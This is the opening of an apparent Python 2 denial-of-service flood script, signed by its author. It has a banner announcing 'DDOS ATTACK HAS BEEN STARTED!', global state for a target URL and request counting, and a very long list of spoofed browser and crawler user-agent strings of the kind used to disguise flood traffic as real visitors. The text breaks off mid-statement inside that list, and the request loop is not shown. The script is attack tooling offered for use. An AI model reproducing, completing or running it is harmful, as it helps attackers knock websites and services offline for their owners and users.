# coded by b3rlin
import urllib2
import sys
import threading
import random
import re


def banner():
    print \
        """                        .
             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |   Sultan |  |  |     |         |      |
     |  |  Bad command or |  |  |/----|`---=    |      |
     |  |  |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"
        /_)______________(_/  //'   | +---------+
   _____We do not forgive !______________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
|||DDOS ATTACK HAS BEEN STARTED!|||
    """


banner()
#global params
url = ''
host = ''
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0


def inc_counter():
    global request_counter
    request_counter += 1


def set_flag(val):
    global flag
    flag = val


def set_safe():
    global safe
    safe = 1

# generates a user agent array


def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    headers_useragents.append(
        'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    headers_useragents.append(
        'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
    headers_useragents.append(
        'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
    headers_useragents.append(
        'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
    headers_useragents.append(
        'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append(
        'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
    headers_useragents.append(
        'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
    headers_useragents.append(
        'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
    headers_useragents.append(
        'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
    headers_useragents.append(
        'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
    headers_useragents.append(
        'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
    headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
    headers_useragents.append(
        'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
    headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
    headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
    headers_useragents.append(
        'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
    headers_useragents.append(
        'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
    headers_useragents.append(
        'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
    headers_useragents.append(
        'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
    headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
    headers_useragents.append(
        'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
    headers_useragents.append(
        'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    headers_useragents.append(
        'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
